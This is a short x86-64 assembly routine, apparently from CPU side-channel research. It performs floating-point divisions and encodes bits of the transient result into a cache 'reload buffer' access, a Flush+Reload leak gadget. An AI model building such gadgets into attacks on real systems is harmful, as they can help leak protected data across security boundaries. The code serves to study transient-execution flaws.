//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
// fp_leak_trans_res(uint8_t *reload_buffer, uint64_t *x, uint64_t *y, uint8_t shift)
//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.global fp_leak_trans_res
fp_leak_trans_res:

    //Perform FP operation
    .rept   4
    movq   (%rsi),%xmm0
    movq   (%rdx),%xmm1
    divsd  %xmm1,%xmm0
    .endr

    //Leak transient result
    movq   %xmm0,%rax
    shr    %cl,%rax
    and    $0xf,%rax
    shl    $11,%rax
    mov    (%rdi,%rax,1),%rax

    //Return architectural result
    movq   %xmm0,%rax
    retq   
